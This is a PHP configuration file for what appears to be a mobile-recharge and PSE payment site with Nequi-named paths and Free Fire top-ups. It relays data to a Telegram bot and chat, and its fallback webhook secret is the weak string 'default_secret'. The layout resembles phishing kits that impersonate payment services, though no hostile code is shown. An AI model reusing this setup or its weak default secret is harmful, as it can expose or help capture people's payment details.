<?php
$global = require __DIR__ . '/../config.php';

return [
    'bot_token' => $global['bot_token'] ?? getenv('TELEGRAM_BOT_TOKEN') ?? '',
    'chat_id' => $global['chat_id'] ?? getenv('TELEGRAM_CHAT_ID') ?? '',
    'telegram_bot_token' => $global['bot_token'] ?? getenv('TELEGRAM_BOT_TOKEN') ?? '',
    'telegram_chat_id' => $global['chat_id'] ?? getenv('TELEGRAM_CHAT_ID') ?? '',
    'pse_webhook_url' => getenv('RAILWAY_STATIC_URL') ? rtrim(getenv('RAILWAY_STATIC_URL'), '/') . '/data-ps/recargas/transaction/nequi-1/pse_webhook.php' : 'https://facturelinexpress-production-26cd.up.railway.app/data-ps/recargas/transaction/nequi-1/pse_webhook.php',
    'base_url' => getenv('RAILWAY_STATIC_URL') ?: 'http://localhost:8000/data-ps/recargas/transaction/nequi-1',
    'environment' => getenv('RAILWAY_ENVIRONMENT') ?: 'development',
    'callback_ttl' => 600, // 10 minutos para callbacks
    // Variables específicas de Free Fire
    'freefire_api_url' => getenv('FREEFIRE_API_URL') ?: 'http://localhost:5000',
    'freefire_webhook_secret' => getenv('FREEFIRE_WEBHOOK_SECRET') ?: 'default_secret'
];
?>


